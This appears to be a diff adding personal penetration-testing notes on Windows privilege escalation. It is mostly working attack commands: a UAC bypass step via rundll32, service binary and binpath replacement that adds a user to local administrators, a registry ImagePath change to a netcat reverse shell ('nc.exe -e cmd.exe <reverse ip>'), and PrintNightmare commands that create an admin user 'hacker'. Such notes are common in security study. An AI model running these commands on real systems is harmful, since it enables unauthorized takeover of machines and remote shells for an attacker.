@@ -1,0 +1,87 @@
+[Windows Vulnerabilities.](https://msrc.microsoft.com/update-guide/vulnerability)
+[User Account Control](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works) 
+	consent prompted elevated privileges. 
+	[How it works](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works) 
+		[10 Group Policy Settings](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/settings-and-configuration?tabs=intune)
+		Forces an attacker to become noisy. 
+		RID 500 Admin always operates at a higher mandatory level with Admin Approval Mode (AAM) enabled. 
+		New accounts operate at medium level.
+	Confirm UAC is enabled:
+		`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`		
+	Check UAC level:
+		`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
+			0x5 is the highest level.
+	UAC works different on windows [versions](https://en.wikipedia.org/wiki/Windows_10_version_history)
+			PS = `[environment]::OSVersion.Version`
+	[UAC bypasses.](https://github.com/hfiref0x/UACME)
+		Find a UAC that works in targets window version under keys. 
+		Google may have tutorial for exploit?
+			Run a DLL
+				`rundll32 shell32.dll,Control_RunDLL <path to dll>`
+Weak Permissions 
+	[SharpUp](https://github.com/GhostPack/SharpUp/) from GhostPack suite
+		Checks for weak ACLs on binaries. 
+			`.\SharpUp.exe audit`
+			Service Binaries:
+			Verify vuln with [icals](https://ss64.com/nt/icacls.html)
+				`icals <path to exe>`
+			Replace the binary with a malicious one through msfvenom
+				`cmd /c copy /Y <exe> "<path to target>"`
+				`sc start <service name>
+			Service Permissions 
+			Check permissions with [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
+			`accesschk.exe /accepteula -quvcw <service>` (.exe not needed)
+					-q = omit banner
+					-u = surpress erros
+					-v = verobse
+					-c = specify name of windows service
+					-w = objects with write only. 
+				Change the service binary:
+					`sc config WindscribeService binpath="cmd /c net localgroup administrators <user>/add"``
+				Stop the service 
+					`sc stop <service>`
+				Start the service 
+					`sc start <service>`
+				confirm local access
+					`net local group administrators`
+	Cleanup
+		Revert the binary path 
+			`sc config <service> binpath="<path>"`
+		Start the service 
+			`sc start <service>`
+	Unquoted Service Paths
+		Rare to exploit. If service path isn't in ""  windows will search for it in root path. 
+		May be able to hijack the service. 
+		Search for unquoted service path:
+			`wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """``
+	Permissive Registry ACLs. 
+		Search for weak ACLs
+			`accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services`
+		Change the ImagePath value in powershell
+			`Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "<path to nc.exe> -e cmd.exe <reverse ip> <reverse port>"`
+	Modify Registry Autorun Binaries.
+		`Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl`
+		If you have write permissions to a binary you may be able to escalate privileges next time that user logs in. 
+Kernel Exploits
+	If SAM is readable: [CVE-2021-36934](https://www.exploit-db.com/docs/50245)
+	[CVE-2021-1675 / CVE-2021-34527](https://www.exploit-db.com/docs/50537)Print Nightmare
+		check for spooler service 
+			`ls \\localhost\pipe\spoolss`
+		Add local admin with printnightmare 
+			`Set-ExecutionPolicy Bypass -scope Process`
+		Import powershell script
+			`Import-Module ./CVE-2021-1675.ps1`
+			`Invoke-Nightmare -NewUser "hacker" -NewPassword "1234" -DriverName "Print"`
+		Confirm new user 
+			`net user hacker`
+			
+	
+	
+	
+	
+
+
+	
+	
+	
+	
